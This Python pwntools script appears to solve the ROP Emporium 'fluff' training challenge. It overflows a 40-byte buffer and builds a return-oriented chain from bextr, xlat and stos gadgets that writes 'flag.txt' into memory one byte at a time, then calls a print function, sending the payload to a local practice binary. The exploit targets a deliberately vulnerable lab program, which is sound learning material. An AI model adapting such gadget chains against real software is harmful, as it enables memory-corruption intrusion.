from pwn import *

PAYLOAD  = b'A'*40
data    = p64(0x0000000000601028)
pop_rdi = p64(0x00000000004006a3)
counter = 0

p = process('fluff')

addrs = [0x6003c4-0xb,	#F 66 OK
 		 0x4003c1-0x66, #L 6c OK
		 0x400411-0x6c, #A 61 OK
		 0x4003cf-0x61, #G 67 OK
		 0x4003fd-0x67, #. 2E OK
		 0x40040e-0x2e, #T 74 OK
		 0x400246-0x74, #X 78 OK
		 0x40040e-0x78] #T 74 OK

def control_rbx(value):
	# pop   rdx
	# pop   rcx
	# add   rcx, 0x3ef2
	# bextr rbx, rcx, rdx
	index = p64(0x4000)
	value= (value-0x3ef2)
	address = p64(value)
	bextr = p64(0x000000000040062a)
	return(bextr + index + address)

def control_rax():
	#xlat BYTE PTR ds:[rbx]
	xlat = p64(0x0000000000400628)
	return(xlat)
	
def control_rdi():
	#stos BYTE PTR es:[rdi],al
	stos = p64(0x0000000000400639)
	return(stos)


#Writing address with payload
for addr in addrs:
	if (addr == 0x6003c4-0xb):
		print("First")
		PAYLOAD += control_rbx(addr) + control_rax() + pop_rdi + data + p64(0x0400639)
	else:
		PAYLOAD += control_rbx(addr) + control_rax() + control_rdi()
	counter += 1

PAYLOAD += pop_rdi + data +p64(0x0000000000400620)
	 
f = open("payload.txt", "wb")
f.write(PAYLOAD)
f.close()

p.sendline(PAYLOAD)
p.interactive()